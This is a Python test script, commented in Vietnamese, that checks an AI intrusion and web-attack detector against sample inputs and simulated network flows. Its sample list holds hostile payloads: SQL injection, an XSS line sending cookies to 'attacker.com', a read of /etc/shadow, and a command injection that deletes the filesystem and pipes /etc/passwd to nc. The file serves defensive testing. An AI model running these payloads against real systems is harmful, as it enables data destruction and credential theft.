import os
import sys

if hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8')
if hasattr(sys.stderr, 'reconfigure'):
    sys.stderr.reconfigure(encoding='utf-8')

# Thêm thư mục backend vào sys.path
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, BASE_DIR)

from core.ai_detector import AIDetector

def run_test():
    print("=" * 70)
    print("      KIỂM THỬ SUY LUẬN MÔ HÌNH AI PHÁT HIỆN TẤN CÔNG (INFERENCE TEST)")
    print("=" * 70)

    detector = AIDetector()
    status = detector.get_status()
    print(f"\n[1] Trạng thái nạp mô hình:")
    print(f"    - NIDS Binary:     {' SẴN SÀNG' if status['models']['nids_binary'] else '❌ Chưa nạp'}")
    print(f"    - NIDS Multiclass: {' SẴN SÀNG' if status['models']['nids_multiclass'] else '❌ Chưa nạp'}")
    print(f"    - Web Payload:     {' SẴN SÀNG' if status['models']['web_payload'] else '❌ Chưa nạp'}")
    print(f"    - Nhóm NIDS:       {status['nids_classes']}")
    print(f"    - Nhóm Web:        {status['web_classes']}")

    # ─────────────────────────────────────────────────────────────────────────
    # KIỂM THỬ DỰ ĐOÁN TẤN CÔNG WEB (WAF / PAYLOAD)
    # ─────────────────────────────────────────────────────────────────────────
    print("\n" + "=" * 70)
    print("[2] Kiểm thử nhận diện Web Payload (CSIC-2010):")
    print("=" * 70)

    test_payloads = [
        ("GET /index.php?page=home&lang=vi HTTP/1.1", "Bình thường (norm)"),
        ("SELECT * FROM accounts WHERE user='admin' OR '1'='1'--", "SQL Injection (sqli)"),
        ("<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>", "XSS Script (xss)"),
        ("/var/www/html/../../../../etc/shadow", "Path Traversal (path-traversal)"),
        ("; rm -rf / ; cat /etc/passwd | nc 10.0.0.1 4444", "Command Injection (cmdi)"),
        ("product_id=105&category=electronics", "Bình thường (norm)"),
        ("' UNION SELECT username, password_hash FROM admin_users--", "SQL Injection (sqli)"),
        ("<img src=x onerror=alert('PWNED')>", "XSS Injection (xss)"),
    ]

    for payload, expected_desc in test_payloads:
        result = detector.predict_payload(payload)
        is_att = result["is_attack"]
        att_type = result["attack_type"]
        conf = result["confidence"] * 100
        risk = result["risk_score"]

        icon = "🚨 CẢNH BÁO" if is_att else " AN TOÀN "
        print(f"\n[{icon}] {expected_desc}")
        print(f"  → Payload:      \"{payload[:60]}{'...' if len(payload) > 60 else ''}\"")
        print(f"  → Kết quả AI:   {att_type.upper()} (Độ tin cậy: {conf:.2f}%) | Risk Score: {risk}/100")

    # ─────────────────────────────────────────────────────────────────────────
    # KIỂM THỬ DỰ ĐOÁN LUỒNG MẠNG NIDS
    # ─────────────────────────────────────────────────────────────────────────
    print("\n" + "=" * 70)
    print("[3] Kiểm thử nhận diện luồng mạng NIDS (CICIDS):")
    print("=" * 70)

    # Thử nghiệm với vector 77 đặc trưng (mẫu bình thường và mẫu tấn công mô phỏng)
    sample_normal_flow = [0.0] * 77
    sample_normal_flow[0] = 50000.0   # Flow Duration
    sample_normal_flow[1] = 5.0       # Total Fwd Packets
    sample_normal_flow[2] = 4.0       # Total Backward Packets
    sample_normal_flow[47] = 1.0      # ACK Flag

    res_normal = detector.predict_flow(sample_normal_flow)
    print(f"\n Mẫu luồng mạng 1 (Bình thường):")
    print(f"  → Phân loại: {res_normal['attack_type']} | Tấn công: {res_normal['is_attack']} | Tự tin: {res_normal['confidence']*100:.2f}%")

    # Mẫu mô phỏng DDoS/PortScan: Flow Duration cực ngắn, Packet rate cực cao, SYN flood
    sample_flood_flow = [0.0] * 77
    sample_flood_flow[0] = 100.0      # Duration cực ngắn
    sample_flood_flow[1] = 5000.0     # Số gói fwd rất lớn
    sample_flood_flow[14] = 50000.0   # Flow Packets/s cực cao
    sample_flood_flow[43] = 5000.0    # SYN Flag count liên tục

    res_flood = detector.predict_flow(sample_flood_flow)
    print(f"\n🚨 Mẫu luồng mạng 2 (Mô phỏng SYN Flood / DDoS):")
    print(f"  → Phân loại: {res_flood['attack_type']} | Tấn công: {res_flood['is_attack']} | Tự tin: {res_flood['confidence']*100:.2f}%")

    print("\n" + "=" * 70)
    print(" HOÀN TẤT TẤT CẢ CÁC BÀI KIỂM THỬ SUY LUẬN AI!")
    print("=" * 70)

if __name__ == "__main__":
    run_test()
